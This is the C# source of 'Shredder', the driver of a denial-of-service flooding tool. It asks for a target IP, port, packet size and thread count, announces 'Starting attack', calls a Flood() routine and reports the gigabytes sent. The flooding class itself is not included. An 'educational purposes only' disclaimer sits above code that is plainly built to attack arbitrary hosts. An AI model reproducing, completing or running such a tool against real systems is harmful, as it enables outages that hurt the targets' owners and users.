/*!-----------------------------------------------------------------------------
 * For educational purposes only
 * Attacking system without consent is illegal
 *-----------------------------------------------------------------------------*/


using System.Net;

namespace Shredder
{
    public class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Enter the IP to Shred:");
            string ip = GetUserInput();
            Console.WriteLine();

            while (!IsValidIpAddress(ip))
            {
                Console.WriteLine("Error! Please enter a correct IP address:");
                ip = GetUserInput();
            }

            Console.WriteLine("Enter port (press enter to attack all ports):");
            string portInput = GetUserInput();
            int port = 0;

            if (!string.IsNullOrWhiteSpace(portInput))
            {
                while (!int.TryParse(portInput, out port) || port < 1 || port > 65535)
                {
                    Console.WriteLine("Error! Please enter a correct port:");
                    portInput = GetUserInput();
                }
            }

            Console.WriteLine("Bytes per packet (press enter for 1250):");
            string forceInput = GetUserInput();
            int force = string.IsNullOrWhiteSpace(forceInput) ? 1250 : 0;

            if (force == 0)
            {
                while (!int.TryParse(forceInput, out force))
                {
                    Console.WriteLine("Error! Please enter an integer for bytes per packet:");
                    forceInput = GetUserInput();
                }
            }

            Console.WriteLine("Threads (press enter for 100):");
            string threadsInput = GetUserInput();
            int threads = string.IsNullOrWhiteSpace(threadsInput) ? 100 : 0;

            if (threads == 0)
            {
                while (!int.TryParse(threadsInput, out threads))
                {
                    Console.WriteLine("Error! Please enter an integer for threads:");
                    threadsInput = GetUserInput();
                }
            }

            Console.WriteLine($"Starting attack on {ip}:{port}.");
            Console.Write($"{"",10}");

            Shred shred = new Shred(ip, port, force, threads);

            try
            {
                shred.Flood();
            }
            catch
            {
                shred.Stop();
                Error("A fatal error has occurred and the attack was stopped.");
            }

            try
            {
                while (true)
                {
                    Thread.Sleep(1000000);
                }
            }
            catch (ThreadInterruptedException)
            {
                shred.Stop();
                Console.WriteLine($"Attack stopped. {ip}:{port} was shredded with {Math.Round(shred.Total, 1)} Gb.");
            }

            Console.WriteLine();
            Thread.Sleep(1000);

            Console.WriteLine("Press enter to exit.");
            Console.ReadLine();
        }

        private static string GetUserInput()
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            string input = Console.ReadLine();
            Console.ResetColor();
            return input;
        }

        private static bool IsValidIpAddress(string ipAddress)
        {
            return IPAddress.TryParse(ipAddress, out _);
        }

        private static void Error(string text)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"\n! {text}");
            Console.ResetColor();
        }
    }
}